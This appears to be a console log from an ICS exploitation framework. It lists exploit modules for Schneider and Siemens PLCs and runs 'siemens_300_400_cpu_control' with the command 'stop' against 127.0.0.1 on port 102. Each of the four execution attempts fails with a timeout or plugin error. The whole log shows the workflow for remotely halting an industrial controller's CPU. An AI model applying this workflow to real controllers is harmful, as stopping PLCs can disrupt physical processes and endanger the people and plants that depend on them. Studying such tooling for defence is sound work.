isf > autorun
[*] Autorun ON

Exploit Autorun List
====================

  0) apply
  1) touch all
  2) prompt confirm
  3) execute


Payload Autorun List
====================

  0) apply
  1) prompt confirm
  2) execute


isf > setg FbStorage D:\isf\isf\storage
[+] Set FbStorage =>. D:\isf\isf\storage
isf > info

                                   ???
                             ???????????????
                          ?????           ?????
                       ????                   ????
                     ????                       ????
                    ???                           ???
                   ???             ??              ???
                  ???           ????????            ???
                 ???           ???????????           ???
                 ???          ?????????????          ???
                 ??          ???????????????          ??
                 ??         ?????????????????         ??
                 ??        ??????       ?????         ??
                 ??            ???????????            ??
                 ??            ???????????            ??
                 ??             ?????????             ??
                 ???             ???????             ???
                 ???              ?????              ???
                  ???          ???????????          ???
                   ???      ?????????????????      ???
                    ???   ????????????????????    ???
                      ?????????????????????????????
                       ???????????????????????????
                          ?????????????????????
                             ---ICSMASTER---

+ - - - - - + [ Version 1.1.1                           ] + - - - - - + 
+ - - - - - + [ 3 Exploits                              ] + - - - - - + 
+ - - - - - + [ MADE BY ICSMASTER. HTTP://ICSMASTER.COM ] + - - - - - + 

isf > use

Plugin Category: Exploit
========================

  Name                            Version
  ----                            -------
  Schneider_CPU_Command           1.1.0
  Test_MM                         3.1.0
  siemens_300_400_cpu_control     1.1.0

isf > use siemens_300_400_cpu_control

[!] Entering Plugin Context :: siemens_300_400_cpu_control
[*] Applying Global Variables

isf Exploit (siemens_300_400_cpu_control) > apply
[*] Applying Session Parameters
isf Exploit (siemens_300_400_cpu_control) > echo Running Exploit Touches
[*] Running Exploit Touches
isf Exploit (siemens_300_400_cpu_control) > touch all
isf Exploit (siemens_300_400_cpu_control) > enter Exploit

isf Exploit (siemens_300_400_cpu_control) > prompt confirm

[!] Enter Prompt Mode :: siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp                                                              
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[!] plugin variables are valid

[*]  TargetIp :: Target IP Address

[+] Set TargetIp => 127.0.0.1

[*]  TargetPort :: Target Port

[+] Set TargetPort => 102

[*]  Slot :: The number of slot

[+] Set Slot => 3

[*]  Command :: The control command of cpu [stop/cold/hot]

[+] Set Command => stop

isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[*] Executing Plugin
[-] Timeout error
[-] Error running plugin: 
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > execute

[!] Preparing to Execute siemens_300_400_cpu_control

Module: siemens_300_400_cpu_control
===================================

  Name            Value                                                 
  ----            -----                                                 
  TargetIp        127.0.0.1                                             
  TargetPort      102                                                   
  Slot            3                                                     
  Command         stop                                                  

[*] Executing Plugin
[!] Plugin failed
[-] Error: siemens_300_400_cpu_control Failed
isf Exploit (siemens_300_400_cpu_control) > EOF
